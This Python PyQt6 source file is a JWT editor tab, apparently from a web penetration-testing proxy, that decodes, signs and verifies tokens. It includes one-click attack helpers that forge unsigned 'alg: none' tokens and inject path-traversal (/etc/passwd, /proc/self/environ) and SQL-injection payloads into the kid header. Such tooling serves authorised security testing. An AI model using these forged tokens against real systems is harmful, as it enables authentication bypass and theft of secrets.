"""
JWT Editor — parse, edit, sign, and verify JSON Web Tokens.

Supports HS256/384/512 (HMAC), RS256/384/512 (RSA-PKCS1v1.5), and ES256
(ECDSA P-256).  Includes one-click `alg: none` and common `kid` path
injection variants.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Optional

from PyQt6.QtCore import Qt, pyqtSignal
from PyQt6.QtWidgets import (
    QComboBox,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QMessageBox,
    QPushButton,
    QSplitter,
    QTextEdit,
    QVBoxLayout,
    QWidget,
)

try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec, padding, rsa
    from cryptography.exceptions import InvalidSignature
    _CRYPTO_OK = True
except Exception:  # pragma: no cover
    _CRYPTO_OK = False


_TEXTEDIT_SS = (
    "QTextEdit { background: #181825; border: 1px solid #313244; "
    "color: #cdd6f4; font-family: monospace; font-size: 12px; }"
)
_LINEEDIT_SS = (
    "QLineEdit { background: #181825; border: 1px solid #313244; "
    "padding: 4px; color: #cdd6f4; }"
)
_BTN_SS = (
    "QPushButton { background: #313244; border: 1px solid #45475a; "
    "padding: 4px 10px; border-radius: 4px; color: #cdd6f4; }"
    "QPushButton:hover { background: #45475a; }"
    "QPushButton:disabled { color: #585b70; }"
)


# ---------------------------------------------------------------------------
# base64url helpers
# ---------------------------------------------------------------------------

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(data: str) -> bytes:
    s = data.strip()
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


# ---------------------------------------------------------------------------
# Signing primitives
# ---------------------------------------------------------------------------

_HMAC_ALGS = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}

_RSA_HASH = {
    "RS256": "sha256",
    "RS384": "sha384",
    "RS512": "sha512",
}


def _hash_for(name: str):
    if name == "sha256":
        return hashes.SHA256()
    if name == "sha384":
        return hashes.SHA384()
    if name == "sha512":
        return hashes.SHA512()
    raise ValueError(f"Unknown hash: {name}")


def sign_token(header: dict, payload: dict, alg: str, secret_or_key: str) -> str:
    """Sign a JWT and return the compact serialization."""
    header = dict(header)
    header["alg"] = alg
    h_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()

    if alg == "none":
        return f"{h_b64}.{p_b64}."

    if alg in _HMAC_ALGS:
        sig = hmac.new(secret_or_key.encode(), signing_input, _HMAC_ALGS[alg]).digest()
        return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"

    if not _CRYPTO_OK:
        raise RuntimeError("cryptography package not installed — RS/ES algs unavailable")

    key_bytes = secret_or_key.encode()
    if alg in _RSA_HASH:
        key = serialization.load_pem_private_key(key_bytes, password=None)
        if not isinstance(key, rsa.RSAPrivateKey):
            raise ValueError("Provided key is not an RSA private key")
        sig = key.sign(
            signing_input,
            padding.PKCS1v15(),
            _hash_for(_RSA_HASH[alg]),
        )
        return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"

    if alg == "ES256":
        key = serialization.load_pem_private_key(key_bytes, password=None)
        if not isinstance(key, ec.EllipticCurvePrivateKey):
            raise ValueError("Provided key is not an EC private key")
        der_sig = key.sign(signing_input, ec.ECDSA(hashes.SHA256()))
        # Convert DER to raw r||s for JWS
        from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
        r, s = decode_dss_signature(der_sig)
        raw = r.to_bytes(32, "big") + s.to_bytes(32, "big")
        return f"{h_b64}.{p_b64}.{b64url_encode(raw)}"

    raise ValueError(f"Unsupported algorithm: {alg}")


def verify_token(token: str, alg: str, secret_or_key: str) -> tuple[bool, str]:
    """Returns (valid, message)."""
    try:
        h_b64, p_b64, s_b64 = token.split(".")
    except ValueError:
        return False, "Token must have three dot-separated segments"

    signing_input = f"{h_b64}.{p_b64}".encode()

    if alg == "none":
        return s_b64 == "", ("Signature must be empty for alg=none"
                             if s_b64 != "" else "alg=none, no signature required")

    try:
        sig = b64url_decode(s_b64)
    except Exception as e:
        return False, f"Signature is not valid base64url: {e}"

    if alg in _HMAC_ALGS:
        expected = hmac.new(secret_or_key.encode(), signing_input, _HMAC_ALGS[alg]).digest()
        return (hmac.compare_digest(sig, expected),
                "HMAC valid" if hmac.compare_digest(sig, expected) else "HMAC mismatch")

    if not _CRYPTO_OK:
        return False, "cryptography package not installed"

    key_bytes = secret_or_key.encode()
    try:
        if alg in _RSA_HASH:
            pub = serialization.load_pem_public_key(key_bytes)
            if not isinstance(pub, rsa.RSAPublicKey):
                return False, "Provided key is not an RSA public key"
            pub.verify(sig, signing_input, padding.PKCS1v15(), _hash_for(_RSA_HASH[alg]))
            return True, "RSA signature valid"

        if alg == "ES256":
            pub = serialization.load_pem_public_key(key_bytes)
            if not isinstance(pub, ec.EllipticCurvePublicKey):
                return False, "Provided key is not an EC public key"
            if len(sig) != 64:
                return False, "ES256 signature must be 64 raw bytes"
            from cryptography.hazmat.primitives.asymmetric.utils import encode_dss_signature
            r = int.from_bytes(sig[:32], "big")
            s = int.from_bytes(sig[32:], "big")
            pub.verify(encode_dss_signature(r, s), signing_input, ec.ECDSA(hashes.SHA256()))
            return True, "ECDSA signature valid"
    except InvalidSignature:
        return False, "Signature failed verification"
    except Exception as e:
        return False, f"Verification error: {e}"

    return False, f"Unsupported algorithm: {alg}"


# ---------------------------------------------------------------------------
# JWT Editor tab
# ---------------------------------------------------------------------------

class JWTEditorTab(QWidget):
    """UI for editing, signing, and verifying JSON Web Tokens."""

    send_to_repeater = pyqtSignal(str)  # emits the re-encoded token

    def __init__(self, parent: Optional[QWidget] = None) -> None:
        super().__init__(parent)

        root = QVBoxLayout(self)

        root.addWidget(QLabel("Token (paste a JWT):"))
        self.token_in = QTextEdit()
        self.token_in.setStyleSheet(_TEXTEDIT_SS)
        self.token_in.setMaximumHeight(80)
        root.addWidget(self.token_in)

        ctrl = QHBoxLayout()
        decode_btn = QPushButton("Decode")
        decode_btn.setStyleSheet(_BTN_SS)
        decode_btn.clicked.connect(self._decode)
        ctrl.addWidget(decode_btn)

        ctrl.addWidget(QLabel("Alg:"))
        self.alg_combo = QComboBox()
        self.alg_combo.addItems([
            "HS256", "HS384", "HS512",
            "RS256", "RS384", "RS512",
            "ES256",
            "none",
        ])
        ctrl.addWidget(self.alg_combo)

        ctrl.addWidget(QLabel("Secret / PEM key:"))
        self.secret_edit = QLineEdit()
        self.secret_edit.setStyleSheet(_LINEEDIT_SS)
        self.secret_edit.setPlaceholderText("HMAC secret, or PEM string with \\n")
        ctrl.addWidget(self.secret_edit, 1)

        sign_btn = QPushButton("Sign")
        sign_btn.setStyleSheet(_BTN_SS)
        sign_btn.clicked.connect(self._sign)
        ctrl.addWidget(sign_btn)

        verify_btn = QPushButton("Verify")
        verify_btn.setStyleSheet(_BTN_SS)
        verify_btn.clicked.connect(self._verify)
        ctrl.addWidget(verify_btn)

        root.addLayout(ctrl)

        # Attack helpers
        attack_row = QHBoxLayout()
        none_btn = QPushButton("Attack: alg=none")
        none_btn.setStyleSheet(_BTN_SS)
        none_btn.setToolTip("Strip signature, set alg=none, re-encode")
        none_btn.clicked.connect(self._attack_alg_none)
        attack_row.addWidget(none_btn)

        kid_btn = QPushButton("Attack: kid path injection")
        kid_btn.setStyleSheet(_BTN_SS)
        kid_btn.setToolTip("Insert common kid path-traversal payloads into the header")
        kid_btn.clicked.connect(self._attack_kid)
        attack_row.addWidget(kid_btn)

        attack_row.addStretch()
        self.status_label = QLabel("")
        self.status_label.setStyleSheet("color: #a6e3a1;")
        attack_row.addWidget(self.status_label)
        root.addLayout(attack_row)

        # Three editable JSON panes
        panes = QSplitter(Qt.Orientation.Horizontal)

        def _pane(title: str) -> tuple[QWidget, QTextEdit]:
            w = QWidget()
            v = QVBoxLayout(w)
            v.setContentsMargins(2, 2, 2, 2)
            v.addWidget(QLabel(title))
            te = QTextEdit()
            te.setStyleSheet(_TEXTEDIT_SS)
            v.addWidget(te)
            return w, te

        h_pane, self.header_edit = _pane("Header (JSON)")
        p_pane, self.payload_edit = _pane("Payload (JSON)")
        s_pane, self.sig_edit = _pane("Signature (base64url, read-only)")
        self.sig_edit.setReadOnly(True)
        panes.addWidget(h_pane)
        panes.addWidget(p_pane)
        panes.addWidget(s_pane)
        panes.setSizes([300, 400, 300])
        root.addWidget(panes, 1)

        # Output token
        root.addWidget(QLabel("Encoded token (after Sign / Attack):"))
        self.token_out = QTextEdit()
        self.token_out.setStyleSheet(_TEXTEDIT_SS)
        self.token_out.setMaximumHeight(80)
        root.addWidget(self.token_out)

        send_row = QHBoxLayout()
        send_row.addStretch()
        copy_btn = QPushButton("Copy")
        copy_btn.setStyleSheet(_BTN_SS)
        copy_btn.clicked.connect(self._copy_out)
        send_row.addWidget(copy_btn)
        root.addLayout(send_row)

    # ------------------------------------------------------------------

    def _set_status(self, text: str, ok: bool = True) -> None:
        self.status_label.setStyleSheet("color: #a6e3a1;" if ok else "color: #f38ba8;")
        self.status_label.setText(text)

    def _normalize_secret(self, raw: str) -> str:
        """Convert literal '\\n' to real newlines so users can paste single-line PEMs."""
        return raw.replace("\\n", "\n")

    def _decode(self) -> None:
        token = self.token_in.toPlainText().strip()
        try:
            h_b64, p_b64, s_b64 = token.split(".")
        except ValueError:
            self._set_status("Token must have three dot-separated segments", ok=False)
            return
        try:
            header = json.loads(b64url_decode(h_b64).decode(errors="replace"))
            payload = json.loads(b64url_decode(p_b64).decode(errors="replace"))
        except Exception as e:
            self._set_status(f"Decode error: {e}", ok=False)
            return
        self.header_edit.setPlainText(json.dumps(header, indent=2))
        self.payload_edit.setPlainText(json.dumps(payload, indent=2))
        self.sig_edit.setPlainText(s_b64)
        self.token_out.setPlainText(token)
        # Auto-select algorithm if present
        alg = header.get("alg", "")
        idx = self.alg_combo.findText(alg)
        if idx >= 0:
            self.alg_combo.setCurrentIndex(idx)
        self._set_status(f"Decoded — alg={alg}")

    def _read_panes(self) -> tuple[dict, dict]:
        header = json.loads(self.header_edit.toPlainText() or "{}")
        payload = json.loads(self.payload_edit.toPlainText() or "{}")
        return header, payload

    def _sign(self) -> None:
        try:
            header, payload = self._read_panes()
        except json.JSONDecodeError as e:
            self._set_status(f"JSON error: {e}", ok=False)
            return
        alg = self.alg_combo.currentText()
        secret = self._normalize_secret(self.secret_edit.text())
        try:
            token = sign_token(header, payload, alg, secret)
        except Exception as e:
            self._set_status(f"Sign error: {e}", ok=False)
            return
        self.token_out.setPlainText(token)
        # Update sig pane
        try:
            self.sig_edit.setPlainText(token.split(".")[2])
        except IndexError:
            self.sig_edit.setPlainText("")
        self._set_status(f"Signed with {alg}")

    def _verify(self) -> None:
        token = self.token_out.toPlainText().strip() or self.token_in.toPlainText().strip()
        alg = self.alg_combo.currentText()
        secret = self._normalize_secret(self.secret_edit.text())
        ok, msg = verify_token(token, alg, secret)
        self._set_status(msg, ok=ok)

    def _attack_alg_none(self) -> None:
        try:
            header, payload = self._read_panes()
        except json.JSONDecodeError as e:
            self._set_status(f"JSON error: {e}", ok=False)
            return
        header["alg"] = "none"
        token = sign_token(header, payload, "none", "")
        self.header_edit.setPlainText(json.dumps(header, indent=2))
        self.alg_combo.setCurrentText("none")
        self.token_out.setPlainText(token)
        self.sig_edit.setPlainText("")
        self._set_status("Built alg=none token")

    def _attack_kid(self) -> None:
        try:
            header, payload = self._read_panes()
        except json.JSONDecodeError as e:
            self._set_status(f"JSON error: {e}", ok=False)
            return

        candidates = [
            "../../../../../../dev/null",
            "../../../../../../etc/passwd",
            "../../../../../../proc/self/environ",
            "'||'1",
            "1' UNION SELECT 'x",
        ]
        # Emit one token per candidate in the output area (newline-separated)
        out_lines = []
        for kid in candidates:
            h = dict(header)
            h["kid"] = kid
            secret = self._normalize_secret(self.secret_edit.text())
            alg = self.alg_combo.currentText() or "HS256"
            try:
                token = sign_token(h, payload, alg, secret)
            except Exception:
                continue
            out_lines.append(f"# kid={kid!r}\n{token}")
        self.token_out.setPlainText("\n\n".join(out_lines))
        self._set_status(f"Generated {len(out_lines)} kid-injection variants")

    def _copy_out(self) -> None:
        from PyQt6.QtWidgets import QApplication
        QApplication.clipboard().setText(self.token_out.toPlainText())
        self._set_status("Copied output to clipboard")
